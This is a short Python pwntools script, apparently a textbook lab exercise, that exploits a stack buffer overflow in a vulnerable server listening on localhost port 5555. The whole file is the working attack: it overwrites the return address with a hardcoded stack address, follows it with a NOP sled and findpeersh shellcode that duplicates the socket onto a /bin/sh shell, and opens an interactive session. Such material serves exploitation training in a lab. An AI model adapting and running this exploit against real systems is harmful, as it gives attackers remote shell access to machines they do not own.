#!/usr/bin/env python3
#ch10_6_exploit.py
from pwn import *

context(bits=32, arch='i386')

# Connect to vulnerable ch10_6 server
p = remote('localhost', 5555)

# findpeersh ( dup2(socket) + execve(/bin/sh) ) shellcode
shellcode  = asm(shellcraft.findpeersh())
nopsled_address = p32(0xffffd418)

# Craft our payload
payload  = b"A"*264
payload += nopsled_address
payload += b"\x90"*32
payload += shellcode

p.sendlineafter(b"Username: ", payload) # Send payload
p.interactive()

